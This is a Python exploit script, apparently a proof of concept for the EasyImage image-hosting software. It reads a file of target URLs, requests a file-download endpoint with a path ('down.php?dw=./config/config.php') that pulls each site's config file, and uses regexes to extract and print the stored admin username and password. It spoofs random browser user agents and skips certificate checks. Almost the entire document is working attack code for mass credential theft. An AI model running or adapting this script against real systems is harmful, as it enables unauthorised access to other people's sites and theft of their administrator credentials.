import requests
import random
import re

requests.packages.urllib3.disable_warnings()

def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

headers = {
      'User-Agent': get_ua(),
}
payload = "/application/down.php?dw=./config/config.php"

obj_user = re.compile(r"'user'=>'(?P<user>.*?)'",re.S)
obj_password = re.compile(r"'password'=>'(?P<password>.*?)'",re.S)

w = open(r"H:\tools\POC\EasyImage\url.txt" ,encoding="utf-8")
data = w.readlines()

print(r'''
   _____  _______  _______          _________ _______  _______  _______  _______ 
(  ____ \(  ___  )(  ____ \|\     /|\__   __/(       )(  ___  )(  ____ \(  ____ \
| (    \/| (   ) || (    \/( \   / )   ) (   | () () || (   ) || (    \/| (    \/
| (__    | (___) || (_____  \ (_) /    | |   | || || || (___) || |      | (__    
|  __)   |  ___  |(_____  )  \   /     | |   | |(_)| ||  ___  || | ____ |  __)   
| (      | (   ) |      ) |   ) (      | |   | |   | || (   ) || | \_  )| (      
| (____/\| )   ( |/\____) |   | |   ___) (___| )   ( || )   ( || (___) || (____/\
(_______/|/     \|\_______)   \_/   \_______/|/     \||/     \|(_______)(_______/   by goubuli_bald                                                                              
''')
for url in data:
	url = url.replace('\n', '')
	try:
		res = requests.get(url + payload ,headers=headers,timeout=10,verify=False)
		res.close()
		if res.status_code == 200 and "user" in res.text:
			print("\033[32m[+]%s is vuln\033[0m" % url)
			user = obj_user.findall(res.text)
			for i in user:
				user = i
			password = obj_password.findall(res.text)
			for i in password:
				password = i
			print(r'''
			+-------------------------------------------+
			|url:{}                                     
			+-------------------------------------------+
			|user:{}                                    
			+-------------------------------------------+
			|password:{}                                
			+-------------------------------------------+'''.format(url,user,password)
				  )
	except:
		pass
print("任务已完成")